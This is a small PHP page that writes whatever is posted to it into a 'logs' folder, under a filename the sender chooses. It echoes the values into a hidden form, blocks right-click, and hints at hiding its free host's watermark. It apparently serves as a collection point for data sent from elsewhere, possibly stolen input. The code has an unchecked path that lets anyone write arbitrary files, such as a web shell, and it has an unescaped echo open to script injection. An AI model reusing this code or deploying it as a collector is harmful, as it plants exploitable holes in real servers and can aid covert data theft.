<?php
    if(isset($_POST["dat"])) {
        $Filename = $_POST["filename"];
        $Dat = $_POST["dat"];
        $Filepath = "logs/" . $Filename;

        $Writer = fopen($Filepath, "w") or die("Unable to open file!");
        fwrite($Writer, $Dat);
        fclose($Writer);
    } else {
        $Filename = "";
        $Dat = "";
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title></title>
    <style>
        /*
        // Uncomment to remove watermark if using 000webhost as a web host
        img[src*='https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png'] {
            display: none;
        }
        */
    </style>
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script>
</head>
<body>
    <form id="FForm" action="" method="post" style="display:none;">
        <input type="text" name="dat" id="dat" value="<?php echo $Dat; ?>">
        <input type="text" name="filename" id="filename" value="<?php echo $Filename; ?>">
        <input type="submit" name="submit" id="submitBtn" value="SubmitForm">
    </form>
</body>
</html>
